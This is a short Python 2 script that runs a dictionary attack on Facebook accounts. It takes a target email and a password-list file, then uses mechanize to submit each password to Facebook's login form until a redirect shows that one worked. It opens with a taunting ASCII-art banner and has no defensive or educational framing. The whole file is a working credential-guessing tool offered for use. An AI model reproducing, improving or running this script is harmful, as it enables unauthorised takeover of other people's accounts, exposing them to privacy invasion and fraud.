import sys,os
import random
import mechanize
import cookielib
#COLORS============#
blue = '\033[94m'  #
green = '\033[32m' #
red = '\033[91m'   #
w = '\033[0m'      #
#==================#
os.system("cls")
print red+'''
+================================+
|*|            |*|         ___
|*|            |*|       //   \*
|*|    //\*    |*|      // //\ \*
|*|   /*/\*\   |*|     // // / //
|*|  /*/  \*\  |*|    // // / //
|*| /*/    \*\ |*|   // //_/ //
|_|///      \*\|_|  //______//'
+===============================+
you !!
you Look familiar !! :)
+===============================+

'''
email = str(raw_input(red+"[+]:Enter Email #~:"))
passwordlist = str(raw_input(red+"[+]:Enter the name of the password list file#~:"))

useragents = [('User-agent',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

login = 'https://www.facebook.com/login.php'


def attack(password):
    try:
        sys.stdout.write(blue+"\r[*] trying %s.. " % password)
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr=0)

        ##Facebook
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        log = br.geturl()
        endattake = "https://www.facebook.com/"
        if log == endattake:
            print green+"\n\n\n [*] Password found .. !!"
            print green+"\n [*] Password : %s\n" % (password)
            print(w+"")
            sys.exit(1)
    except KeyboardInterrupt:
        print
        "\n[*] Exiting program .. "
        sys.exit(1)


def search():
    global password
    for password in passwords:
        attack(password.replace("\n", ""))


def check():
    global br
    global passwords
    try:
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print
        "\n[*] Exiting program ..\n"
        sys.exit(1)
    try:
        list = open(passwordlist, "r")
        passwords = list.readlines()
        k = 0
        while k < len(passwords):
            passwords[k] = passwords[k].strip()
            k += 1
    except IOError:
        print
        "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print
        "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print
        "\n [*] Exiting program ..\n"
        sys.exit(1)


if __name__ == '__main__':
    check()
